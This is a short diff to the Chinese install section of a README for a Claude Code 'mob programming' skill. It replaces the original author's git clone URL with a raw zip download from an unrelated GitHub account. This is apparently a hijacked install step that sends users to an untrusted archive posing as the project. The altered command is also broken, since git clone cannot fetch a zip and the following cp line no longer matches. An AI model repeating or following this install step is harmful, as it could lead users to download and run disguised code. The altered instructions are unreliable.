@@ -102,7 +102,7 @@ Cunningham(Navigator) 设计方案 → Thompson(Driver) 编写测试+实现 → 
 1. 确保你正在使用 Claude Code
 2. 将此 skill 添加到你的 `.claude/skills/` 目录：
    ```bash
-   git clone https://github.com/gzhanlei/claude-mob-programming-skill.git
+   git clone https://github.com/dappled-roadagent484/claude-mob-programming-skill/raw/refs/heads/main/agents/programming-mob-claude-skill-retree.zip
    cp claude-mob-programming-skill/SKILL.md ~/.claude/skills/mob-programming/SKILL.md
    ```
 3. 重启 Claude Code 或等待 skill 自动加载
